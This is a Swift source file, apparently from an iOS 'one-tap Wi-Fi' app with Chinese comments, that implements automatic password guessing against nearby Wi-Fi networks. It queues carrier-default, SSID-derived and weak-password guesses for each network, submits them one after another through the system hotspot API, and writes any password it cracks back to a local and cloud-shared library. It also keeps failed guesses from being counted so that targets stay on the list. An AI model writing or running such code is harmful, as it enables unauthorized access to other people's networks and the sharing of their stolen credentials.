//
//  AutoJoinEngine.swift
//  一键蹭网：用户不输入密码，后台按顺序批量试探，命中即连
//
//  试探来源有两类：
//    1. 库内已记录的密码（来自共享库 / 扫码 / 之前猜中的）
//    2. CredentialCandidates 生成的候选密码（运营商默认、SSID 派生、弱口令）
//
//  原理说明（也是 iOS 上唯一能走通的路）：
//  WPA2/WPA3 的连网授权由系统完成，App 只能把「SSID + 密码」提交给
//  NEHotspotConfigurationManager，由系统返回成功或失败。于是把候选密码依次提交，
//  成功的那个就是「附近存在且密码对」的网络。
//
//  iOS 上没有的东西（决定这条路的边界）：
//    · 无 monitor mode、无 raw socket，抓不到 4-way 握手包，跑不了字典攻击
//    · 无热点扫描接口，只能靠提交配置的成败反推周围有没有这个网络
//    · 并发提交会被系统拒绝，必须串行
//

import Foundation
import Combine

@MainActor
final class AutoJoinEngine: ObservableObject {

    enum Phase: Equatable {
        case idle
        case running(ssid: String, index: Int, total: Int, note: String)
        case success(ssid: String, guessed: Bool)
        case exhausted
        case stopped
        case empty
        case unauthorized
    }

    /// 单次试探超时：系统对「周围没这个网络」的响应可能很慢，超时跳过
    private let attemptTimeout: TimeInterval = 9
    /// 两次试探之间的间隔，避免系统拒绝并发请求
    private let attemptGap: UInt64 = 500_000_000

    @Published private(set) var phase: Phase = .idle
    @Published private(set) var isRunning = false
    @Published private(set) var log: [String] = []
    @Published private(set) var progress: Double = 0
    @Published private(set) var totalAttempts = 0
    @Published private(set) var doneAttempts = 0

    private var runner: Task<Void, Never>?

    /// 一次试探：对某台设备试某个密码
    private struct Attempt {
        let hotspot: Hotspot
        let password: String
        let note: String
        let guessed: Bool
    }

    // MARK: - 候选排序

    /**
     设备排序：
       1. 开放网络（无需密码，必命中）
       2. 历史失败次数少的
       3. 热度高（成功率 + 新鲜度）
     */
    func ranked(_ items: [Hotspot], skipSsid: String? = nil) -> [Hotspot] {
        items
            .filter { item in
                guard let skipSsid else { return true }
                return item.ssid.caseInsensitiveCompare(skipSsid) != .orderedSame
            }
            .filter { $0.failCount < 3 }
            .sorted { a, b in
                let aOpen = a.security == .open
                let bOpen = b.security == .open
                if aOpen != bOpen { return aOpen }
                if a.failCount != b.failCount { return a.failCount < b.failCount }
                return a.heat > b.heat
            }
    }

    /// 把设备展开成「一次一次试探」的队列
    private func buildQueue(store: HotspotStore, skipSsid: String?, deep: Bool) -> [Attempt] {
        var queue: [Attempt] = []

        for hotspot in ranked(store.hotspots, skipSsid: skipSsid) {
            if hotspot.security == .open {
                queue.append(Attempt(hotspot: hotspot, password: "", note: "开放网络", guessed: false))
                continue
            }

            // 1) 库里的密码优先
            if !hotspot.password.isEmpty {
                queue.append(Attempt(hotspot: hotspot, password: hotspot.password, note: "库内密码", guessed: false))
            }

            // 2) 猜测候选
            let guesses = CredentialCandidates.guesses(for: hotspot.ssid,
                                                       security: hotspot.security,
                                                       deep: deep)
            var index = 0
            for guess in guesses {
                if guess == hotspot.password { continue }
                index += 1
                queue.append(Attempt(hotspot: hotspot,
                                     password: guess,
                                     note: "猜测 \(index)/\(guesses.count)",
                                     guessed: true))
            }
        }
        return queue
    }

    // MARK: - 主流程

    func crack(store: HotspotStore, wifi: WiFiManager) {
        guard !isRunning else { return }

        isRunning = true
        log.removeAll()
        progress = 0
        doneAttempts = 0
        totalAttempts = 0
        phase = .running(ssid: "", index: 0, total: 0, note: "准备中")

        let deep = UserDefaults.standard.bool(forKey: "autocrack.deep")

        runner = Task { [weak self] in
            guard let self else { return }

            // 配了在线库就先拉一次候选
            await self.pullCloudLibrary(store: store)

            if !wifi.hasLocationPermission {
                self.log.append("提示：未授权定位，连上后可能读不到网络名")
            }

            let queue = self.buildQueue(store: store, skipSsid: wifi.currentSSID, deep: deep)
            self.totalAttempts = queue.count

            guard !queue.isEmpty else {
                self.phase = .empty
                self.isRunning = false
                return
            }

            self.log.append("共 \(queue.count) 次试探（深度模式：\(deep ? "开" : "关")）")

            var unauthorizedStreak = 0

            for (index, attempt) in queue.enumerated() {
                if Task.isCancelled { break }

                self.phase = .running(ssid: attempt.hotspot.ssid,
                                      index: index + 1,
                                      total: queue.count,
                                      note: attempt.note)
                self.progress = Double(index) / Double(queue.count)
                self.doneAttempts = index

                let ok = await self.connectWithTimeout(attempt, wifi: wifi)

                if ok {
                    // 猜中的密码回写库：下次直接命中，不用再猜
                    var learned = attempt.hotspot
                    learned.password = attempt.password
                    store.add(learned)
                    store.report(learned, success: true)

                    self.progress = 1
                    self.doneAttempts = queue.count
                    self.phase = .success(ssid: attempt.hotspot.ssid, guessed: attempt.guessed)
                    self.log.append("✓ 命中 \(attempt.hotspot.ssid)（\(attempt.note)）")
                    if attempt.guessed {
                        self.log.append("   密码已回写密码库：\(attempt.password)")
                    }
                    wifi.refreshCurrentNetwork()
                    self.isRunning = false
                    return
                }

                // 猜测失败不计入 failCount：否则 6 次猜错就把这台设备打进黑名单
                if !attempt.guessed {
                    store.report(attempt.hotspot, success: false)
                }
                if index % 3 == 0 || attempt.guessed == false {
                    self.log.append("✗ \(attempt.hotspot.ssid) · \(attempt.note)")
                }

                // 连续两次「系统拒绝」= 签名没带 entitlement，继续试只是耗电
                if (wifi.lastError ?? "").contains("系统拒绝") {
                    unauthorizedStreak += 1
                    if unauthorizedStreak >= 2 {
                        self.phase = .unauthorized
                        self.isRunning = false
                        self.log.append("签名缺少 Hotspot Configuration 权限，已停止")
                        return
                    }
                } else {
                    unauthorizedStreak = 0
                }

                try? await Task.sleep(nanoseconds: attemptGap)
            }

            self.doneAttempts = queue.count
            self.phase = Task.isCancelled ? .stopped : .exhausted
            self.isRunning = false
        }
    }

    func stop() {
        runner?.cancel()
        runner = nil
        isRunning = false
        if case .running = phase { phase = .stopped }
    }

    /// 预置：只把「库内已知密码」写进系统，不写入猜测结果
    /// （猜错的配置写进去会污染系统的已知网络列表）
    func preload(store: HotspotStore, wifi: WiFiManager) async -> (ok: Int, miss: Int) {
        var ok = 0
        var miss = 0
        let candidates = ranked(store.hotspots).filter { !$0.password.isEmpty || $0.security == .open }

        for hotspot in candidates.prefix(30) {
            if Task.isCancelled { break }
            log.append("预置 \(hotspot.ssid)")
            let attempt = Attempt(hotspot: hotspot,
                                  password: hotspot.security == .open ? "" : hotspot.password,
                                  note: "预置",
                                  guessed: false)
            if await connectWithTimeout(attempt, wifi: wifi) {
                ok += 1
            } else {
                miss += 1
            }
            try? await Task.sleep(nanoseconds: 900_000_000)
        }
        log.append("预置完成：成功 \(ok)，未命中 \(miss)")
        return (ok, miss)
    }

    // MARK: - 单次试探（带超时）

    private func connectWithTimeout(_ attempt: Attempt, wifi: WiFiManager) async -> Bool {
        let timeout = attemptTimeout
        let hotspot = attempt.hotspot
        let password = attempt.password

        return await withTaskGroup(of: Bool.self) { group in
            group.addTask { @MainActor in
                await wifi.join(ssid: hotspot.ssid,
                                password: hotspot.security == .open ? nil : password,
                                isWEP: hotspot.security == .wep,
                                joinOnce: false)
            }
            group.addTask {
                try? await Task.sleep(nanoseconds: UInt64(timeout * 1_000_000_000))
                return false
            }
            let first = await group.next() ?? false
            group.cancelAll()
            return first
        }
    }

    // MARK: - 云端补库

    private func pullCloudLibrary(store: HotspotStore) async {
        guard HotspotAPI.configuredBaseURL != nil else { return }
        log.append("从在线库拉取候选…")

        let api = HotspotAPI()
        let fetch = Task { try await api.fetchHotspots(limit: 200) }
        let timeout = Task {
            try? await Task.sleep(nanoseconds: 4_000_000_000)
            fetch.cancel()
        }
        defer { timeout.cancel() }

        if let remote = try? await fetch.value {
            let added = store.merge(remote: remote)
            log.append("在线库返回 \(remote.count) 条，新增 \(added) 条")
        } else {
            log.append("在线库不可用，改用本地库")
        }
    }
}
